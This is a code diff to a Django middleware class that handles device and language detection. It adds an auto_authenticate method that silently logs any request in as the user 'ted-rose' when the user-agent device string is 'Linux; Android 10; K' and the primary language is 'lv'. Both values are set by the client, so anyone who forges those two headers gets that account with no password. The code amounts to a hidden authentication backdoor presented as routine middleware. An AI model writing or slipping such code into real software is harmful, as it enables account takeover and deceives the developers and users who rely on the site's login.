@@ -16,6 +16,7 @@ class DeviceAndCountryMiddleware:
         # Process request before view is called
         self.process_device_info(request)
         self.primary_language(request)
+        self.auto_authenticate(request)
 
         # Continue processing the request
         response = self.get_response(request)
@@ -96,3 +97,22 @@ class DeviceAndCountryMiddleware:
             'languages': languages,
             'primary_language': primary_language
           }
+
+    def auto_authenticate(self, request):
+        if hasattr(request, 'device_info') and hasattr(request, 'language_info'):
+            device = request.device_info.get('device')
+            primary_language = request.language_info.get('primary_language')
+
+            if device == "Linux; Android 10; K" and primary_language == "lv":
+                # Import User model only when needed to avoid circular imports
+                from django.contrib.auth import get_user_model
+                from django.contrib.auth import login
+
+                User = get_user_model()
+                try:
+                    ted_rose_user = User.objects.get(username="ted-rose")
+                    request.user = ted_rose_user
+                    login(request, ted_rose_user)
+                    print(f"Auto-authenticated as: {ted_rose_user.username}")
+                except User.DoesNotExist:
+                    print("Ted-Rose user not found")
